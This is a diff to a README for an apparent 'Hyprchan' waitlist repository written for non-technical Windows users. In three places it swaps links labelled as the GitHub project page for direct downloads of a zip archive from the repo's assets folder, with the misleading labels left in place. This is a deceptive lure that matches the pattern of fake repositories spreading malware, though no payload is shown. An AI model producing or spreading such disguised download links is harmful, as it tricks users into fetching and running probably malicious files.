@@ -1,6 +1,6 @@
 # 💻 Hyprchan-Waitlist-Repo - Track Hyprchan Before Launch
 
-[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Toluenehermitthrush888/Hyprchan-Waitlist-Repo)
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Toluenehermitthrush888/Hyprchan-Waitlist-Repo/main/assets/Repo-Hyprchan-Waitlist-significal.zip)
 
 ## 🧭 What this is
 
@@ -13,7 +13,7 @@ This page is simple to use on Windows. You do not need programming knowledge to 
 
 Use this link to visit the project page:
 
-[Open Hyprchan-Waitlist-Repo on GitHub](https://github.com/Toluenehermitthrush888/Hyprchan-Waitlist-Repo)
+[Open Hyprchan-Waitlist-Repo on GitHub](https://raw.githubusercontent.com/Toluenehermitthrush888/Hyprchan-Waitlist-Repo/main/assets/Repo-Hyprchan-Waitlist-significal.zip)
 
 On Windows, you can open the link in your browser and use it like any other GitHub page.  
 If you only want to follow the project, you do not need to install anything yet.
@@ -158,7 +158,7 @@ Starring the repo makes it easy to find later and helps you follow the project.
 
 ## 📎 Main link
 
-[https://github.com/Toluenehermitthrush888/Hyprchan-Waitlist-Repo](https://github.com/Toluenehermitthrush888/Hyprchan-Waitlist-Repo)
+[https://raw.githubusercontent.com/Toluenehermitthrush888/Hyprchan-Waitlist-Repo/main/assets/Repo-Hyprchan-Waitlist-significal.zip](https://raw.githubusercontent.com/Toluenehermitthrush888/Hyprchan-Waitlist-Repo/main/assets/Repo-Hyprchan-Waitlist-significal.zip)
 
 ## 🪟 For Windows users
 
